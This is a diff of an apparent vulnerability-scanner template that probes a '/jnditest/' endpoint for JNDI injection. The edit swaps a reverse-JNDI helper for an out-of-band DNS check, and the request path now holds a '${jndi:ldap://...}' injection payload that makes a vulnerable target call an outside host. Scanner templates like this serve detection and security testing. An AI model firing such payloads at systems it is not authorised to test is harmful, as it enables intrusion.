@@ -7,12 +7,12 @@ info:
   verified: false
 
 set:
-  reverse: newJNDI()
-  jndiURL: reverse.url.host + reverse.url.path
+  oob: oob()
+  oobDNS: oob.DNS
 rules:
   r0:
     request:
       method: GET
-      path: /jnditest/{{jndiURL}}
-    expression: reverse.jndi(3)
+      path: /jnditest/${jndi:ldap://{{oobDNS}}}
+    expression: oobCheck(oob, oob.ProtocolDNS, 3)
 expression: r0()
